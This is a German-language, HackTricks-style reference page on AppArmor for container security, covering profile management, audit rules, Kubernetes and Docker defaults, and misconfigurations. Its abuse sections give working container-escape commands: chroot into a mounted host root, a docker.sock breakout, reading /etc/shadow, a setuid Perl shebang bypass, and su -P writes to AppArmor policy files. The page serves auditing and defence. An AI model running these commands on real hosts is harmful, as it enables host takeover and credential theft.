# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

AppArmor ist ein **Mandatory Access Control**-System, das Einschränkungen mithilfe programmspezifischer Profile durchsetzt. Anders als bei herkömmlichen DAC-Prüfungen, die stark von Benutzer- und Gruppenzugehörigkeiten abhängen, kann der Kernel mit AppArmor eine Richtlinie durchsetzen, die direkt an den Prozess gebunden ist. In Container-Umgebungen ist das wichtig, weil eine Workload möglicherweise über genügend herkömmliche Privilegien verfügt, um eine Aktion zu versuchen, aber trotzdem daran gehindert wird, weil ihr AppArmor-Profil den betreffenden Pfad, das Mount-Verhalten, das Netzwerkverhalten oder die Nutzung einer Capability nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Es bewertet den Dateisystemzugriff anhand von Pfadregeln und nicht anhand von Labels wie SELinux. Das macht es zugänglich und leistungsstark, bedeutet aber auch, dass Bind-Mounts und alternative Pfadstrukturen sorgfältig berücksichtigt werden müssen. Wenn dieselben Host-Inhalte unter einem anderen Pfad erreichbar werden, entspricht die Wirkung der Richtlinie möglicherweise nicht den Erwartungen des Operators.

## Rolle bei der Container-Isolation

Bei Sicherheitsprüfungen von Containern werden oft nur Capabilities und seccomp betrachtet, aber AppArmor bleibt auch nach diesen Prüfungen relevant. Stell dir einen Container vor, der mehr Privilegien als nötig besitzt, oder eine Workload, die aus betrieblichen Gründen eine zusätzliche Capability benötigte. AppArmor kann den Dateizugriff, das Mount-Verhalten, das Netzwerkverhalten und Ausführungsmuster weiterhin so einschränken, dass der naheliegende Missbrauchsweg blockiert wird. Deshalb kann das Deaktivieren von AppArmor, „damit die Anwendung funktioniert“, eine lediglich riskante Konfiguration unbemerkt in eine direkt ausnutzbare verwandeln.

## Lab

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwende:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Um zu sehen, unter welchem Profil der aktuelle Containerprozess läuft:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Der Unterschied ist aufschlussreich. Im Normalfall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom Runtime ausgewählte Profil gebunden ist. Im unconfined-Fall entfällt diese zusätzliche Einschränkungsebene.

Du kannst auch prüfen, was Docker deiner Ansicht nach angewendet hat:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Laufzeitverwendung

Docker kann ein Standard- oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann auf AppArmor-basierten Systemen ebenfalls mit AppArmor integriert werden, während auf SELinux-first-Distributionen häufig das andere MAC-System im Mittelpunkt steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene bereitstellen, sofern die Knoten AppArmor tatsächlich unterstützen. Auch LXC und verwandte Ubuntu-Systemcontainer-Umgebungen verwenden AppArmor umfangreich.

Wichtig ist: AppArmor ist kein „Docker-Feature“. Es ist eine Host-Kernel-Funktion, die verschiedene Laufzeitumgebungen anwenden können. Unterstützt der Host AppArmor nicht oder wird die Laufzeitumgebung angewiesen, ohne Einschränkungen zu laufen, ist der vermeintliche Schutz nicht wirklich vorhanden.

Für Kubernetes lautet die moderne API `securityContext.appArmorProfile`. Seit Kubernetes `v1.30` sind die älteren Beta-AppArmor-Annotationen veraltet. Auf unterstützten Hosts ist `RuntimeDefault` das Standardprofil, während `Localhost` auf ein Profil verweist, das bereits auf dem Knoten geladen sein muss. Das ist bei einer Prüfung wichtig, denn ein Manifest kann zwar AppArmor berücksichtigen, aber dennoch vollständig von der Unterstützung auf dem Knoten und den dort vorab geladenen Profilen abhängen.<sup>[[1]](#references)</sup>

Ein subtiler, aber nützlicher operativer Aspekt: `appArmorProfile.type: RuntimeDefault` explizit festzulegen ist strenger, als das Feld einfach wegzulassen. Wird das Feld explizit gesetzt und unterstützt der Knoten AppArmor nicht, sollte die Admission fehlschlagen. Wird das Feld weggelassen, kann der Workload auch auf einem Knoten ohne AppArmor laufen, erhält dann aber möglicherweise nicht diese zusätzliche Einschränkungsebene. Aus Sicht eines Angreifers ist das ein guter Grund, sowohl das Manifest als auch den tatsächlichen Zustand des Knotens zu prüfen.<sup>[[1]](#references)</sup>

Auf AppArmor-Hosts, die Docker unterstützen, ist `docker-default` das bekannteste Standardprofil. Dieses Profil wird aus Mobys AppArmor-Vorlage generiert und ist wichtig, weil es erklärt, warum manche auf Capabilities basierenden PoCs in einem Standardcontainer trotzdem fehlschlagen. Grob gesagt erlaubt `docker-default` gewöhnliche Netzwerkkommunikation, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert den Zugriff auf sensible Bereiche von `/sys`, blockiert Mount-Operationen und schränkt ptrace ein, sodass es nicht als allgemeines Mittel zur Untersuchung des Hosts dient. Wer diese Ausgangslage kennt, kann besser unterscheiden zwischen „der Container hat `CAP_SYS_ADMIN`“ und „der Container kann diese Capability tatsächlich gegen die für mich relevanten Kernel-Schnittstellen einsetzen“.

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` gespeichert. Eine gängige Namenskonvention ist, Schrägstriche im ausführbaren Pfad durch Punkte zu ersetzen. Ein Profil für `/usr/bin/man` wird beispielsweise häufig unter `/etc/apparmor.d/usr.bin.man` gespeichert. Das ist sowohl bei der Verteidigung als auch bei einer Prüfung wichtig, denn sobald du den Namen des aktiven Profils kennst, kannst du die zugehörige Datei auf dem Host oft schnell finden.

Zu den nützlichen Verwaltungsbefehlen auf dem Host gehören:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Der Grund, warum diese Befehle in einer Referenz zur Containersicherheit wichtig sind: Sie erklären, wie Profile tatsächlich erstellt, geladen, in den complain mode versetzt und nach Änderungen an Anwendungen angepasst werden. Wenn ein Operator beim Troubleshooting dazu neigt, Profile in den complain mode zu versetzen und anschließend vergisst, die Durchsetzung wieder zu aktivieren, kann der Container in der Dokumentation geschützt wirken, sich in Wirklichkeit aber viel weniger restriktiv verhalten.

### Profile erstellen und aktualisieren

`aa-genprof` kann das Verhalten einer Anwendung beobachten und interaktiv beim Erstellen eines Profils helfen:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` kann ein Vorlagenprofil generieren, das später mit `apparmor_parser` geladen werden kann:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Wenn sich die Binärdatei ändert und die Richtlinie aktualisiert werden muss, kann `aa-logprof` in Protokollen gefundene Zugriffsverweigerungen erneut abspielen und den Operator dabei unterstützen, zu entscheiden, ob diese zugelassen oder abgelehnt werden sollen:

```bash
sudo aa-logprof
```

### Protokolle

AppArmor-Verweigerungen sind oft über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:

```bash
sudo aa-notify -s 1 -v
```

Dies ist operativ und offensiv nützlich. Verteidiger nutzen es, um Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder Vorgang verweigert wird und ob AppArmor die Kontrolle ist, die eine Exploit-Kette blockiert.

### Die genaue Profildatei identifizieren

Wenn eine Runtime für einen Container einen bestimmten AppArmor-Profilnamen anzeigt, ist es oft hilfreich, diesen Namen der Profildatei auf der Festplatte zuzuordnen:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Dies ist besonders während einer Überprüfung auf Host-Seite nützlich, da es die Lücke zwischen „Der Container gibt an, unter dem Profil `lowpriv` zu laufen“ und „Die tatsächlichen Regeln befinden sich in dieser konkreten Datei, die geprüft oder neu geladen werden kann“ schließt.

### Regeln mit hoher Aussagekraft für das Audit

Wenn du ein Profil lesen kannst, solltest du dich nicht auf einfache `deny`-Zeilen beschränken. Mehrere Regeltypen beeinflussen maßgeblich, wie wirksam AppArmor gegen einen Container-Escape-Versuch ist:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: Das Ziel-Binary wird unconfined ausgeführt. Wenn ein erreichbarer Helper, eine Shell oder ein Interpreter mit `ux` erlaubt ist, sollte das üblicherweise als Erstes getestet werden.
- `px` / `Px` und `cx` / `Cx`: Beim Exec werden Profilübergänge durchgeführt. Das ist nicht automatisch schlecht, sollte aber überprüft werden, da ein Übergang in einem deutlich weniger restriktiven Profil als dem aktuellen landen kann.
- `change_profile`: Erlaubt einer Task, sofort oder beim nächsten Exec in ein anderes geladenes Profil zu wechseln. Ist das Zielprofil weniger restriktiv, kann dies zum vorgesehenen Ausweg aus einer restriktiven Domain werden.
- `flags=(complain)`, `flags=(unconfined)` oder neuere `flags=(prompt)`: Diese Flags sollten beeinflussen, wie viel Vertrauen du dem Profil entgegenbringst. `complain` protokolliert Verstöße, anstatt sie durchzusetzen, `unconfined` hebt die Begrenzung auf und `prompt` hängt von einem Userspace-Entscheidungspfad statt von einer ausschließlich vom Kernel durchgesetzten Ablehnung ab.
- `userns` oder `userns create,`: Neuere AppArmor-Policies können die Erstellung von User-Namespaces vermitteln. Wenn ein Container-Profil dies ausdrücklich erlaubt, bleiben verschachtelte User-Namespaces möglich, selbst wenn die Plattform AppArmor als Teil ihrer Härtungsstrategie einsetzt.

Nützlicher `grep`-Befehl auf Host-Seite:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Diese Art von Audit ist oft nützlicher, als sich Hunderte gewöhnliche Dateiregeln anzusehen. Wenn ein Breakout davon abhängt, einen Helfer auszuführen, einen neuen Namespace zu betreten oder in ein weniger restriktives Profil zu wechseln, verbirgt sich die Antwort oft in diesen übergangsbezogenen Regeln und nicht in den offensichtlichen Zeilen im Stil von `deny /etc/shadow r`.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen diese Option oft beim Debuggen einer Anwendung, die fehlschlug, weil das Profil etwas Gefährliches oder Unerwartetes zu Recht blockierte. Bleibt die Option in der Produktionsumgebung gesetzt, wird die gesamte MAC-Schicht praktisch entfernt.

Ein weiteres, subtileres Problem ist die Annahme, dass bind mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor pfadbasiert ist, kann das Bereitstellen von Host-Pfaden unter alternativen Mount-Punkten zu Problemen mit Pfadregeln führen. Ein dritter Fehler ist, zu vergessen, dass ein Profilname in einer Konfigurationsdatei wenig bedeutet, wenn der Host-Kernel AppArmor nicht tatsächlich erzwingt.

## Missbrauch

Wenn AppArmor nicht mehr aktiv ist, funktionieren zuvor eingeschränkte Aktionen möglicherweise plötzlich: das Lesen sensibler Pfade über bind mounts, der Zugriff auf Teile von procfs oder sysfs, die eigentlich schwerer nutzbar sein sollten, mount-bezogene Aktionen, sofern Capabilities und Seccomp diese ebenfalls erlauben, oder die Verwendung von Pfaden, die ein Profil normalerweise verweigern würde. AppArmor ist oft der Grund dafür, dass ein auf Capabilities basierender Breakout-Versuch auf dem Papier „funktionieren sollte“, in der Praxis aber dennoch scheitert. Entfernt man AppArmor, kann derselbe Versuch plötzlich erfolgreich sein.

Wenn du vermutest, dass AppArmor der Hauptgrund dafür ist, dass eine Path-Traversal-, bind-mount- oder mount-basierte Missbrauchskette scheitert, vergleicht man normalerweise zuerst, was mit und ohne Profil zugänglich wird. Wenn beispielsweise ein Host-Pfad im Container eingebunden ist, prüfe zunächst, ob du ihn durchlaufen und lesen kannst:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Wenn der Container außerdem über eine gefährliche Capability wie `CAP_SYS_ADMIN` verfügt, ist einer der praktischsten Tests, ob AppArmor Mount-Operationen oder den Zugriff auf sensible Kernel-Dateisysteme blockiert:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

In Umgebungen, in denen ein Host-Pfad bereits über einen Bind-Mount verfügbar ist, kann der Verlust von AppArmor außerdem dazu führen, dass aus einem schreibgeschützten Information-Disclosure-Problem ein direkter Zugriff auf Host-Dateien wird:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Der Zweck dieser Befehle ist nicht, dass AppArmor allein den Ausbruch ermöglicht. Vielmehr lassen sich nach dem Entfernen von AppArmor viele dateisystem- und mountbasierte Missbrauchspfade sofort testen.

### Vollständiges Beispiel: AppArmor deaktiviert + Host-Root eingebunden

Wenn das Host-Root-Dateisystem bereits unter `/host` in den Container eingebunden ist, kann das Entfernen von AppArmor einen zuvor blockierten dateisystembasierten Missbrauchspfad in eine vollständige Flucht aus dem Host verwandeln:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Sobald die Shell über das Host-Dateisystem ausgeführt wird, hat die Workload die Container-Grenze praktisch verlassen:

```bash
id
hostname
cat /etc/shadow | head
```

### Vollständiges Beispiel: AppArmor deaktiviert + Runtime-Socket

Wenn AppArmor der eigentliche Schutz für den Laufzeitstatus war, kann ein eingebundener Socket für einen vollständigen Ausbruch ausreichen:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Der genaue Pfad hängt vom Mountpoint ab, aber das Ergebnis ist dasselbe: AppArmor verhindert den Zugriff auf die Runtime-API nicht mehr, und die Runtime-API kann einen Container starten, der den Host kompromittiert.

### Vollständiges Beispiel: pfadbasierter Bind-Mount-Bypass

Da AppArmor pfadbasiert ist, wird derselbe Inhalt des Host-procfs nicht automatisch geschützt, wenn er über einen anderen Pfad erreichbar ist:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Die Auswirkungen hängen davon ab, was genau gemountet ist und ob der alternative Pfad auch andere Kontrollen umgeht. Dieses Muster ist jedoch einer der deutlichsten Gründe dafür, AppArmor zusammen mit dem Mount-Layout und nicht isoliert zu betrachten.

### Vollständiges Beispiel: Shebang Bypass

AppArmor kann dem Pfad des ausgeführten Skripts ein Profil zuweisen, statt dem Interpreter, der in dessen Shebang angegeben ist. Umgekehrt kann der direkte Aufruf des Interpreters dessen Profil auswählen. Ein [AppArmor-Maintainer beschreibt diesen Unterschied](https://bugs.launchpad.net/apparmor/+bug/1911431). Ein historisches Beispiel betraf ein Skript, dessen erste Zeile auf einen eingeschränkten Interpreter verweist:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Das Beispiel ist nur ein möglicher Fall, in dem die Dateifähigkeit des Interpreters wirksam werden kann und das tatsächliche exec-Attachment des Skripts den Vorgang erlaubt. Prüfe die geladene Policy und das Prozesslabel, die Capability-Bounding-Set, `no_new_privs` und den `nosuid`-Status des Mounts; ein Profil-Dateiname oder ein `cap_setuid+ep`-Eintrag allein beweist keinen nutzbaren Übergang. Interpreter-Ketten und alternative Ausführungspfade sollten separat geprüft werden.

## Policy-Steuerungsdateien als privilegierte Schreibprimitive

Auf betroffenen AppArmor-Kerneln kann ein unprivilegierter Benutzer die securityfs-Datei `.load`, `.replace` oder `.remove` zum Schreiben öffnen, aber ein direkter Aufruf von `write()` schlägt fehl, da die Berechtigung zur Policy-Verwaltung beim Schreiben geprüft wird. Übernimmt ein setuid-Hilfsprogramm diesen Dateideskriptor als stdout oder stderr und schreibt vom Angreifer kontrollierte Bytes, sieht der Kernel die Anmeldedaten des Hilfsprogramms. Dadurch wird das Hilfsprogramm zu einem *privilegierten Schreiber* von Policy-Daten, nicht zu einer allgemeinen Möglichkeit, dem Aufrufer Root-Rechte zu gewähren. Qualys hat gezeigt, dass `su -P` Bytes eines Befehls, der als derselbe Benutzer ausgeführt wird, über seinen privilegierten PTY-Pfad weiterleiten kann; dafür muss für das Benutzerkonto ein Passwort gesetzt sein. Prüfe die installierten Kernel- und `su`-Fixes, statt einen für alle beschreibbaren Dateimodus als Beleg für eine Gefährdung zu betrachten.<sup>[[3]](#references)[[4]](#references)</sup>

In einer isolierten Testumgebung mit betroffenem Kernel und Hilfsprogramm wird damit ein Testprofil erstellt und anschließend wieder entfernt. Die Shell öffnet jede Steuerungsdatei, bevor `su` in sie schreibt; `stty raw` verhindert, dass die PTY-Weiterleitung die Bytes des kompilierten Profils verändert. Führe den Test nicht mit einem Produktionsprofil aus.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Dasselbe Primitive kann ein vorhandenes Profil ersetzen. Beispielsweise kann ein Profil, das `userns` für einen Launcher erlaubt, eine AppArmor-Beschränkung für User Namespaces aufheben, gewährt jedoch keine Capabilities mit Host-Root-Rechten; die tatsächlichen Namespace-sysctls und sonstigen Kontrollen sind weiterhin relevant. Es kann auch die Einschränkung eines Zielprozesses aufheben. Siehe die [Kernel-Angriffsflächenprüfungen](../../../main-system-information/kernel-vulnerability-assessment.md) und die [Linux-Hardening-Übersicht](../../../) für den umfassenderen Privilege-Escalation-Ablauf.<sup>[[3]](#references)[[4]](#references)</sup>

## Prüfungen

Mit diesen Prüfungen sollen schnell drei Fragen beantwortet werden: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die Runtime tatsächlich ein Profil auf diesen Container angewendet?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert der Workload nicht von der AppArmor-Einschränkung.
- Wenn `aa-status` AppArmor als deaktiviert oder nicht geladen anzeigt, ist jeder Profilname in der Runtime-Konfiguration größtenteils nur Kosmetik.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das oft der Grund dafür, dass ein dateisystem- oder mountbasierter Missbrauchspfad funktioniert.
- Wenn `/sys/kernel/security/apparmor/profiles` das erwartete Profil nicht enthält, reicht die Konfiguration der Runtime oder des Orchestrators allein nicht aus.
- Wenn ein vermeintlich gehärtetes Profil Regeln wie `ux`, weit gefasstes `change_profile`, `userns` oder `flags=(complain)` enthält, ist die praktische Sicherheitsgrenze möglicherweise deutlich schwächer, als der Profilname vermuten lässt.

Wenn ein Container aus betrieblichen Gründen bereits über erhöhte Rechte verfügt, macht ein weiterhin aktiviertes AppArmor oft den Unterschied zwischen einer kontrollierten Ausnahme und einem weitaus umfassenderen Sicherheitsversagen aus.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Auf AppArmor-fähigen Hosts standardmäßig aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern es nicht überschrieben wird | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hostabhängig | AppArmor wird über `--security-opt` unterstützt, aber die genaue Standardeinstellung hängt vom Host und der Runtime ab und ist weniger universell als das dokumentierte Profil `docker-default` von Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingte Standardeinstellung | Wenn `appArmorProfile.type` nicht angegeben ist, lautet die Standardeinstellung `RuntimeDefault`. Sie wird jedoch nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O unter Kubernetes | Abhängig von der Unterstützung durch Node und Runtime | Gängige von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Unterstützung durch den Node und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; durch direkte Runtime-Konfiguration kann AppArmor auch vollständig umgangen werden |

Bei AppArmor ist der **Host** oft die wichtigste Variable, nicht nur die Runtime. Eine Profileinstellung in einem Manifest sorgt nicht für Einschränkung auf einem Node, auf dem AppArmor nicht aktiviert ist.



## References

- [1] [Kubernetes-Sicherheitskontext: AppArmor-Profilfelder und Verhalten bei Node-Unterstützung](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)`-Manpage: Exec-Übergänge, `change_profile`, `userns` und Profil-Flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Technische Sicherheitsempfehlung zu Qualys CrackArmor](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu-Wissensdatenbank zur CrackArmor-Sicherheitslücke](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
